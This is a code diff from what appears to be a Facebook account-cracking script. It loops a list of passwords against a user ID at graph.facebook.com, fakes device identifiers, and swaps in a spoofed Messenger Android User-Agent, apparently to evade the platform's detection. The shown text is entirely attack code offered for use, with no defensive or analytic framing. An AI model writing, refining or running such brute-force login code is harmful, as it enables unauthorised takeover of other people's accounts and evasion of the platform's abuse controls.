@@ -1448,7 +1448,7 @@ def p(uid,pwx,tl):
         for pw in pwx:
             data = {
             'email': uid,
-            'password': "#PWD_MSGR:0:{}:{}".format(str(time.time()).split('.')[0],pw),
+            'password': pw,
             'adid': str(uuid.uuid4()),
             'device_id': str(uuid.uuid4()),
             'family_device_id': str(uuid.uuid4()),
@@ -1478,7 +1478,7 @@ def p(uid,pwx,tl):
             'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
             headers = {
             'Host': 'graph.facebook.com',
-            'User-Agent': UBI_(),
+            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]",
             'Accept-Encoding': 'gzip, deflate',
             'Accept': '*/*',
             'Connection': 'keep-alive',
